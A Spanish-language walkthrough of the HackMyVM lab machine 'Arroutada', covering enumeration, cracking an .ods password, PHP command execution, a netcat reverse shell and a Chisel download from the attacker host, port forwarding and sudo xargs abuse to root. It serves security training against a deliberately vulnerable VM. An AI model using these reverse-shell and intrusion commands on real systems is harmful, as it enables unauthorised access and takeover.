---
title:      "Arroutada"
excerpt:    "Hoy vamos a realizar la segunda máquina de un compañero de la comunidad de HackMyVM, Rijaba1. Esta máquina a pesar de estar catalogada como easy, yo la consideraría medium probablemente. Practicaremos con PHP y veremos un port forwarding."
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/arroutada/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Easy
  - Linux
  - Fuzzing
  - Brute force
  - Port forwading
  - Reverse shell
  - Sudo abuse
---

![](/assets/images/arroutada/prev.png){: .align-center}

Hoy vamos a realizar la segunda máquina de un compañero de la comunidad de HackMyVM, Rijaba1. Esta máquina a pesar de estar catalogada como easy, yo la consideraría medium probablemente. Practicaremos con PHP y veremos un port forwarding.


## Reconocimiento de Puertos

Como es habitual, empezaremos averiguando la IP de la máquina víctima y realizando el reconocimiento de puertos con un pequeño [script](https://github.com/KaianPerez/nmapauto.sh) que creé para automatizar este proceso inicial:

~~~bash
❯ sudo ./nmapauto
[sudo] contraseña para kali: 

 [*] La IP de la máquina víctima es 192.168.1.135

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 00:58 CET
Initiating ARP Ping Scan at 00:58
Scanning 192.168.1.135 [1 port]
Completed ARP Ping Scan at 00:58, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:58
Scanning 192.168.1.135 [65535 ports]
Discovered open port 80/tcp on 192.168.1.135
Completed SYN Stealth Scan at 00:58, 3.05s elapsed (65535 total ports)
Nmap scan report for 192.168.1.135
Host is up, received arp-response (0.00028s latency).
Scanned at 2023-03-02 00:58:50 CET for 3s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:4A:FE:69 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.28 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

 [*] Escaneo avanzado de servicios

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 00:58 CET
Nmap scan report for 192.168.1.135
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:4A:FE:69 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds

 [*] Escaneo completado, se ha generado el fichero InfoPuertos 
 ~~~

Aquí no tenemos más remedio que irnos al puerto 80 jeje, así que vamos a ver qué nos muestra:

![](/assets/images/arroutada/index.png){: .align-center}

Solamente vemos una imagen .png y en el código fuente nada.

Vamos a buscar algún directorio oculto.


### Fuzzing

~~~bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -b 403,404 -x php,txt,html -u $ip -r
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.135
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2023/03/02 01:12:51 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/imgs                 (Status: 200) [Size: 940]
/scout                (Status: 200) [Size: 779]
Progress: 882011 / 882244 (99.97%)
===============================================================
2023/03/02 01:14:09 Finished
===============================================================
~~~

En */imgs* solo está la imagen del index, pero en */scout* hay algo interesante:

![](/assets/images/arroutada/scout.png){: .align-center}

Tras esa pista, vamos a fuzzear ese directorio:

~~~bash
❯ gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -b 403,404 -u $ip/scout/FUZZ/docs
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.135/scout/FUZZ/docs
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Excluded Status codes:   403,404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/02 01:20:35 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=301] [Length=322] http://192.168.1.135/scout/j2/docs

Progress: 218154 / 220561 (98.91%)
===============================================================
2023/03/02 01:21:05 Finished
===============================================================
~~~

Si revisamos ese directorio nos encontramos lo siguiente:

![](/assets/images/arroutada/zz.png){: .align-center}

- *pass.txt* muestra: "user:password"
- *shellfile.ods* está protegido con contraseña. Luego lo revisamos
- El resto son cientos de ficheros vacíos

Bien, vamos a generar un "oneliner" para que nos los lea todos y podamos ver el contenido que contenga alguno:

~~~bash
❯ for x in {1..999}; do curl http://192.168.1.135/scout/j2/docs/z$x >> resultado; done 2>/dev/null
                                                                                                                                                                                         
❯ cat resultado
Ignore z*, please
Jabatito
~~~

Pues por aquí tal y como dice la pista, no vamos a ningún sitio.

Vamos a extraer el hash del fichero .ods:


### Fuerza bruta a fichero .ods

~~~bash
❯ libreoffice2john shellfile.ods > hash
~~~

Y ahora le aplicamos fuerza bruta para crackear la contraseña:

~~~
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 256/256 AVX2 8x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)     
1g 0:00:01:04 DONE (2023-03-02 02:04) 0.01538g/s 254.5p/s 254.5c/s 254.5C/s lachina..emmanuel1
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed. 
~~~

Abrimos el fichero con la contraseña y nos encontramos lo siguiente:

![](/assets/images/arroutada/path.png){: .align-center}

Parece que tenemos un nuevo recurso oculto, si lo cargamos, no vemos nada en pantalla, pero lo ejecuta correctamente con un 200. Por tanto, vamos a fuzzear de nuevo en busca de un parámetro que nos permita ejecutar comandos:

~~~~bash
❯ gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u 192.168.1.135/thejabasshell.php?FUZZ=whoami --exclude-length 0,301
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.1.135/thejabasshell.php?FUZZ=whoami
[+] Method:           GET
[+] Threads:          200
[+] Wordlist:         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Exclude Length:   0,301
[+] User Agent:       gobuster/3.5
[+] Timeout:          10s
===============================================================
2023/03/02 02:43:51 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=33] http://192.168.1.135/thejabasshell.php?a=whoami
~~~~

Parece que hemos localizado el parámetro correcto, veamos que muestra:

~~~~bash
❯ curl 'http://192.168.1.135/thejabasshell.php?a=whoami'
Error: Problem with parameter "b"  
~~~~

Parece que necesitamos un segundo parámetro, vamos a ello:

~~~bash
❯ gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u "192.168.1.135/thejabasshell.php?a=whoami&b=FUZZ" --exclude-length 33,301
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.1.135/thejabasshell.php?a=whoami&b=FUZZ
[+] Method:           GET
[+] Threads:          200
[+] Wordlist:         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Exclude Length:   33,301
[+] User Agent:       gobuster/3.5
[+] Timeout:          10s
===============================================================
2023/03/02 02:51:05 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=9] http://192.168.1.135/thejabasshell.php?a=whoami&b=pass
~~~

Comprobamos de nuevo:

~~~~bash
❯ curl 'http://192.168.1.135/thejabasshell.php?a=whoami&b=pass'
www-data
~~~~

<span style="color: green">**¡BINGO!** </span> Ya hemos encontrado un RCE, por lo que vamos a tratar de entablar una reverse shell.


### Reverse shell

![](/assets/images/arroutada/reverse.png){: .align-center}

Básicamente estamos introduciendo "nc 192.168.1.136 1234 -e /bin/bash" codificado como parámetro, por eso se ve así tan poco "comprensible". De esta forma, desde la máquina víctima, creamos una conexión para ejecutar una bash, que recibiremos al ponernos en escucha en la máquina atacante con Netcat.

Ahora realizamos antes de nada el [tratamiento de la TTY](https://kaianperez.github.io/tty/) para tener una shell interactiva y sin interrupciones.

Si nos vamos a /home vemos el directorio de un usuario, *drito*, en el cual no tenemos permisos. Necesitamos pivotar a él para leer la flag.

En este punto, no localizamos ningún binario SUID ni tenemos permisos sudo como *www-data*, vamos a revisar si hay algún socket en escucha (tanto conexiones TCP como UDP):

~~~~bash
www-data@arroutada:/home$ ss -tunl
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             
tcp    LISTEN  0       4096         127.0.0.1:8000        0.0.0.0:*             
tcp    LISTEN  0       511                  *:80                *:*   
~~~~

Vemos que está corriendo un servicio en local bajo el puerto 8000, por lo que parece ser una web. El problema que tenemos ahora es que no tenemos conectividad desde nuestra máquina de atacante a ese puerto, por lo que tendremos que realizar una **redirección de puertos**.


### Port forwarding

Vamos a usar Chisel para esta acción y traernos el puerto 8000 de la máquina víctima al nuestro. 

En primer lugar crearemos un servidor Python para subir el Chisel a la máquina víctima:

~~~~bash
❯ which chisel                          
/usr/bin/chisel                                                                                                                                                 
❯ cd /usr/bin                                   
❯ python3 -m http.server 80                                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.135 - - [02/Mar/2023 13:03:18] "GET /chisel HTTP/1.1" 200 -
~~~~

Y lo recogemos en la máquina víctima:

~~~~bash
www-data@arroutada:/home$ cd /tmp
www-data@arroutada:/tmp$ wget 192.168.1.136/chisel
--2023-03-02 07:03:17--  http://192.168.1.136/chisel
Connecting to 192.168.1.136:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: 'chisel'

chisel              100%[===================>]   8.34M  --.-KB/s    in 0.06s   

2023-03-02 07:03:17 (151 MB/s) - 'chisel' saved [8750072/8750072]
~~~~

Ahora daremos permiso de ejecución en la máquina víctima a Chisel con `chmod +x chisel` y ejecutaremos:

- En la máquina atacante
`./chisel server --reverse -p 1234`

- En la máquina víctima
`./chisel client 192.168.1.136:1234 R:8000:127.0.0.1:8000`

Ahora ya tenemos creada la conexión, por lo que si miramos nuestro puerto 8000 local:

![](/assets/images/arroutada/localhost.png){: .align-center}

Parece que ese contenido "ilegible" está en [Brainfuck](https://es.wikipedia.org/wiki/Brainfuck), si lo decodificamos con <https://www.dcode.fr/brainfuck-language> el mensaje quedaría como: "This site is from all HackMyVM hackers!!"

Aquí Rijaba1 nos hace un guiño a la comunidad y además, en el código nos da otra pista, que saniticemos el *priv.php*:

~~~~php
❯ curl localhost:8000/priv.php
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
~~~~

Viendo ese fichero, parece que tenemos que pasarle un comando en JSON, para ello vamos a usar la función *Repeater* de *BurpSuite* para ir probando:

![](/assets/images/arroutada/burp.png){: .align-center}

Hemos vuelto a conseguir un RCE, pero en este caso, ya estaríamos pivotando al usuario *drito*.


### 2ª Reverse shell

De esta forma, al igual que antes, volvemos a generar una reverse shell, pero en este caso por el puerto 4444, ya que el 1234 está siendo utilizado por Chisel:

![](/assets/images/arroutada/drito.png){: .align-center}

Volvemos a realizar el [tratamiento de la TTY](https://kaianperez.github.io/tty/), y ahora ya sí podemos leer la flag de user:

~~~~bash
drito@arroutada:~$ cd /home/drito
drito@arroutada:~$ ls
service  user.txt  web
drito@arroutada:~$ cat user.txt
~~~~


## Escalada de privilegios

Vamos a por la flag de root, para ello, como hacemos siempre, vamos a mirar la lista de permisos que tenemos para usar privilegios de otro usuario y apoyarnos en <https://gtfobins.github.io/gtfobins/xargs/#sudo>:

![](/assets/images/arroutada/root.png){: .align-center}

Somos root, pero la flag no es válida, si nos fijamos acaba en "==" lo que nos da a entender que está en **base64**. 

Si la decodificamos con `echo "R3VXXXXXXXXXXXXXXXXXXXJWg==" | base64 -d` todavía sigue sin funcionar, falta algo más.

Para finalizar, habría que aplicarle un **ROT13**, quedando `echo "GunXXXXXXXXXXXXXXXlIZ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`

Ahora sí, tenemos la máquina completamente resuelta.

Agradecer a Rijaba1 por esta máquina, la cual me ha parecido muy divertida y donde nos hace practicar con PHP, que viene muy bien. Nos vemos en la siguiente.










